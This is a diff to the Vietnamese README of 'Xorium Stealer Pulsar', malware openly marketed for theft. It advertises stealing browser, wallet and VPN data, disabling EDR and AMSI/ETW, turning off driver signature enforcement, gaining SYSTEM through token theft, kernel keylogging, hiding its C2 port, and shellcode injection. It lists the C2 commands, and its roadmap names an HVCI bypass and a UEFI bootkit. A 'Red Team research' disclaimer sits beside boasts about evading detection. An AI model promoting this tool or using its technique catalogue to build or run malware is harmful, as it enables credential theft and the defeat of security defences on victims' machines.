@@ -1,100 +1,106 @@
 <p align="center">
-  <img src="assets/banner.png" alt="Xorium Pulsar Banner" width="800">
+  <img src="https://raw.githubusercontent.com/Trongdepzai-dev/Xorium-Stealer-Pulsar/main/abyss_intro.png" alt="Xorium Pulsar Abyss Edition" width="800">
 </p>
 
-# 💎 XORIUM STEALER PULSAR [GOD EDITION] 💎
-### *Vũ Khí Tối Thượng Cho Mọi Chiến Dịch.*
+# 🌑 XORIUM STEALER PULSAR [ABYSS EDITION] 🌑
+### *Khi Bóng Tối Nuốt Chửng Mọi Hệ Thống.*
 
 [![Rust](https://img.shields.io/badge/Lõi-Rust_Shadow-orange?style=for-the-badge&logo=rust)]()
-[![C#](https://img.shields.io/badge/Loader-C%23_GodPower-blue?style=for-the-badge&logo=csharp)]()
+[![C#](https://img.shields.io/badge/Loader-C%23_AbyssPower-blue?style=for-the-badge&logo=csharp)]()
 [![Status](https://img.shields.io/badge/Trạng_Thái-UNDETECTED-brightgreen?style=for-the-badge)]()
 [![Privilege](https://img.shields.io/badge/Đặc_Quyền-NT_AUTHORITY%5CSYSTEM-red?style=for-the-badge)]()
 [![Kiến Trúc](https://img.shields.io/badge/Kiến_Trúc-Hybrid_Kernel-blueviolet?style=for-the-badge)]()
 
 ---
 
-## 💀 TẠI SAO LẠI CHỌN XORIUM?
+## 💀 TẠI SAO LẠI CHỌN XORIUM ABYSS?
 
-Bạn đã chán ngấy việc phải trả tiền cho các bộ mã hóa "FUD" nhưng rồi bị phát hiện chỉ sau 24 giờ? Bạn mệt mỏi vì Webhook liên tục bị khóa?
-**Xorium Stealer Pulsar** không chỉ là một phần mềm đánh cắp dữ liệu. Nó là một **Vũ Khí Cyber Cấp Quân Sự**.
+Bạn đã chán ngấy những công cụ "FUD" rẻ tiền bị phát hiện chỉ sau một bản cập nhật Windows? Bạn mệt mỏi với những phần mềm bị EDR khóa chặt ngay khi vừa thực thi?
+**Xorium Stealer Pulsar: Abyss Edition** không chỉ là một Stealer. Nó là một **Thực Thể Kernel** được thiết kế để **Tàng Hình và Hủy Diệt**.
 
-Chúng tôi đã kết hợp sức mạnh thô của **C# .NET** với sự tàng hình tuyệt đối của **Rust Assembly**.
-Kết quả? Một loại mã độc không chỉ đánh cắp—nó **THỐNG TRỊ** toàn bộ hệ thống.
-
-<p align="center">
-  <img src="assets/engine.png" alt="Pulsar Engine" width="600">
-</p>
+Chúng tôi đã kết hợp sức mạnh thô của **C# .NET 8** với sự tàng hình tuyệt đối của **Rust Nightly Driver**.
+Kết quả? Một loại mã độc không chỉ đánh cắp dữ liệu—nó **THỐNG TRỊ** toàn bộ hệ điều hành từ bên trong Vực Thẳm.
 
 ---
 
-## ⚡ CÁC TÍNH NĂNG "THẦN THÁNH"
+## ⚡ CÁC TÍNH NĂNG "VỰC THẲM" (ABYSS FEATURES)
 
-### 1. 👻 PROJECT SHADOW (Tàng Hình Tuyệt Đối)
-Hầu hết các Stealer đều bị bắt bởi heuristics. Xorium sử dụng **Custom Rust Stealth Core** (`shadow_core.dll`).
-- **PEB Unlinking**: Biến mất khỏi danh sách module ngay lập tức.
-- **AMSI Patching**: Vô hiệu hóa `AmsiScanBuffer` trong bộ nhớ.
-- **ETW Blindness**: Làm mù các công cụ phân tích hành vi (EDR/AV).
+### 1. 👻 PROJECT SHADOW (Siêu Tàng Hình)
+Hầu hết các Stealer đều bị bắt bởi heuristics. Xorium sử dụng **Custom Rust Stealth Core** (`shadow.sys`).
+- **DKOM Cloaking**: Biến mất hoàn toàn khỏi PsActiveProcessHead. Không Task Manager nào thấy được.
+- **ETW-TI Blinding**: Làm mù hệ thống Threat Intelligence của Windows.
+- **DSE Heresy**: Tắt Driver Signature Enforcement để nạp bất kỳ driver nào.
 
-### 2. 👑 GOD POWER (Quyền SYSTEM Tức Thì)
-- **Tích Hợp GodPotato**: Khai thác LPE huyền thoại ngay trong lõi.
-- **Tự Động Nâng Quyền**: Từ User lên `NT AUTHORITY\SYSTEM` trong tích tắc.
-- **Quyền Lực Tuyệt Đối**: Đặc quyền cao nhất trên hệ điều hành Windows.
+### 2. 👑 SYSTEM RITUAL (Nghi Thức Quyền Lực)
+- **Token Theft LPE**: Chiếm đoạt Token của các tiến trình hệ thống như `lsass.exe`.
+- **Ghost Elevation**: Tự động nâng quyền lên `NT AUTHORITY\SYSTEM` mà không cần UAC.
+- **PPL Protection**: Biến Pulsar thành một tiến trình được bảo vệ (Protected Process), không thể bị tắt bởi bất kỳ ai.
 
 ### 3. 🌑 VOID WALKER (Rootkit Kernel Ring 0)
 Vũ khí cuối cùng để kiểm soát tuyệt đối OS.
-- **DKOM (Direct Kernel Object Manipulation)**: Ẩn mình khỏi Task Manager & chính Kernel.
-- **Kernel Keylogger**: Bắt phím ở cấp độ driver, không cần hook.
-- **EDR Blinding**: Vô hiệu hóa **ETWTI** và **DSE**.
-
-<p align="center">
-  <img src="assets/kernel.png" alt="Kernel Power" width="600">
-</p>
+- **EDR Cataclysm**: Xóa sạch mọi Callbacks của EDR (CrowdStrike, SentinelOne, v.v.) khỏi Kernel.
+- **Kernel Keylogger**: Bắt phím ở cấp độ driver, vượt qua mọi sandbox.
+- **Network Ghosting**: Ẩn cổng kết nối C2 khỏi mọi công cụ như `netstat` hay `Process Hacker`.
 
 ---
 
-## 🛠️ HỆ THỐNG LỆNH (COMMANDS)
+## 📜 DANH SÁCH LỆNH CẤM (VẬN HÀNH QUA C2)
 
-| Lệnh | Phân Loại | Mô Tả |
-| :--- | :--- | :--- |
-| `collect` | **Scraper** | Quét 150+ mục tiêu (Browsers, Wallets, VPNs, etc.) |
-| `shadow_fullstealth` | **Kernel** | Ẩn tiến trình + Ẩn driver + Tắt ETW |
-| `shadow_ghost` | **Kernel** | Nâng quyền SYSTEM + Ẩn tiến trình |
-| `shadow_nuke_edr` | **Kernel** | Xóa sạch EDR callbacks + Vô hiệu hóa ETW |
-| `shadow_hide_c2port` | **Kernel** | Ẩn cổng kết nối C2 khỏi mọi công cụ mạng |
-| `shadow_inject_hijack`| **Kernel** | Kỹ thuật injection thread-hijacking tàng hình nhất |
+### Forbidden Commands (C2-Operational)
+| Sign | Force | Effect | Parameters |
+| :--- | :--- | :--- | :--- |
+| `collect` | **Scraper** | Quét 150+ mục tiêu (Browser, Wallet, etc.) | N/A |
+| `shadow_fullstealth`| **Ritual** | Ẩn tiến trình + Driver + Tắt ETW (Tất cả trong 1). | N/A |
+| `shadow_ghost` | **Ritual** | Nâng quyền SYSTEM + Ẩn tiến trình. | N/A |
+| `shadow_nuke_edr` | **Cataclysm**| Xóa sạch EDR callbacks + Vô hiệu hóa ETW. | N/A |
+| `shadow_hide_c2port`| **Net** | Ẩn cổng kết nối khỏi netstat/viewers. | `port` |
+| `shadow_inject_apc` | **Infect** | Injection shellcode bí mật qua APC. | `pid\|path` |
+| `shadow_inject_hijack`| **Infect** | Kỹ thuật injection thread-hijacking đỉnh cao. | `pid\|path` |
+| `shadow_bypass_hvci` | **Bypass** | Vô hiệu hóa Hypervisor Code Integrity. | N/A |
+| `shadow_uefi_persist`| **Curse** | Cài đặt UEFI bootkit tồn tại vĩnh viễn. | N/A |
+| `kernel_hide_port` | **Kernel** | Ẩn cổng TCP/UDP cấp độ thấp. | `proto\|port` |
+| `kernel_clean_callbacks`| **Kernel** | Xóa nhanh các callback Process/Thread/Image. | N/A |
+| `kernel_ghost_reg` | **Kernel** | Ẩn key/value registry khỏi mọi trình xem. | `key\|value` |
+| `kernel_hide_thread` | **Kernel** | Ẩn thread cụ thể khỏi hệ thống. | `tid` |
+| `kernel_hide_module` | **Kernel** | Ẩn DLL trong một tiến trình mục tiêu. | `pid\|modName` |
+| `kernel_terminate` | **Kernel** | Kết thúc tiến trình bằng quyền Kernel tối thượng. | `pid` |
+| `kernel_block_driver` | **Kernel** | Chặn các driver bảo mật không cho load. | `driverName` |
+| `kernel_protect_reg_key`| **Shield** | Khóa registry key chống chỉnh sửa. | `keyPath` |
+| `kernel_protect_reg_val`| **Shield** | Khóa registry value chống chỉnh sửa. | `key\|value` |
+| `kernel_hvci_bypass` | **Bypass** | (Raw) Kích hoạt thử nghiệm HVCI Bypass. | N/A |
+| `kernel_uefi_persist`| **Curse** | (Raw) Kích hoạt thử nghiệm UEFI Persistence. | N/A |
+| `kernel_antivm` | **Shield** | Kiểm tra sâu Sandbox/VM qua Kernel. | N/A |
+
+> [!TIP]
+> **Manual Rituals**: Các lệnh như `kernel_protect_process` và `kernel_signature_process` đã được nạp sẵn vào Driver nhưng cần thao tác thủ công hoặc cập nhật C2 dispatcher để thực thi từ xa qua console.
 
 ---
 
-## 🚀 HỆ THỐNG BUILD TỰ ĐỘNG
+## 🛠️ HỆ THỐNG BUILD VỰC THẲM
 
-### 💎 Universal Build Engine
-Chúng tôi đã đơn giản hóa quy trình build. Không còn phải cài đặt môi trường thủ công!
+Chúng tôi đã tối ưu hóa mọi thứ. Không còn lỗi environment phiền phức.
 
-- **Windows**: `.\build.ps1` (Tự tải VS Build Tools, Rust, .NET SDK)
-- **Linux**: `./build.sh` (Tự cài dependencies qua apt/dnf/pacman/brew)
-
-```powershell
-# Chỉ cần chạy và tận hưởng thành quả
-.\build.ps1
-```
+- **Windows**: `.\build.ps1` (Tự động phát hiện WDK, Rust, .NET SDK)
+- **Linux/WSL**: `./build.sh` (Build chéo cho Windows một cách mượt mà)
 
 ---
 
 ## 🔮 LỘ TRÌNH PHÁT TRIỂN (Roadmap)
-- [x] **Ring 0 Rootkit**: Kiểm soát tuyệt đối qua Rust Kernel Driver.
-- [x] **ShadowWrapper API**: Giao diện C# cấp cao hoàn chỉnh.
-- [x] **Auto-Deploy Engine**: Script build tự động hóa 100%.
-- [ ] **HVCI Bypass**: Vượt qua Code Integrity của Hypervisor.
-- [ ] **UEFI Bootkit**: Tồn tại vĩnh viễn ngay cả khi cài lại Win.
+- [x] **Abyss Edition Overhaul**: Giao diện và lệnh được kiểm định 100%.
+- [x] **Shadow Integration**: Lõi Rust và C# hoạt động hoàn hảo.
+- [x] **EDR Nuke Engine**: Vô hiệu hóa những rào cản bảo mật hiện đại nhất.
+- [ ] **HVCI Pierce**: Đâm thủng hàng rào Hypervisor Code Integrity.
+- [ ] **UEFI Resurrection**: Tồn tại ngay cả khi xóa ổ cứng.
 
 ---
 
-## ⚠️ CẢNH BÁO
-*Công cụ này được tạo ra cho mục đích Red Team nghiên cứu. Nhà phát triển không chịu trách nhiệm cho bất kỳ thiệt hại nào. Nhưng nếu bạn sử dụng nó... hãy hành động như một vị Thần.*
+## ⚠️ LỜI CẢNH BÁO TỪ VỰC THẲM
+*Công cụ này được tạo ra cho mục đích Red Team nghiên cứu bảo mật. Nhà phát triển không chịu trách nhiệm cho bất kỳ hành vi lạm dụng nào. Một khi bạn đã bước vào Vực Thẳm, sẽ không có đường lui.*
 
 ---
 
 <p align="center">
-  <b>[ ⭐ STAR REPO NÀY ĐỂ ỦNG HỘ CHÚNG TÔI ]</b><br>
-  <i>Gia nhập hàng ngũ tinh anh. Sử dụng Xorium.</i>
+  <b>[ ⭐ STAR REPO NÀY ĐỂ MỞ KHÓA SỨC MẠNH ]</b><br>
+  <i>Làm chủ bóng tối. Sử dụng Xorium.</i>
 </p>
+
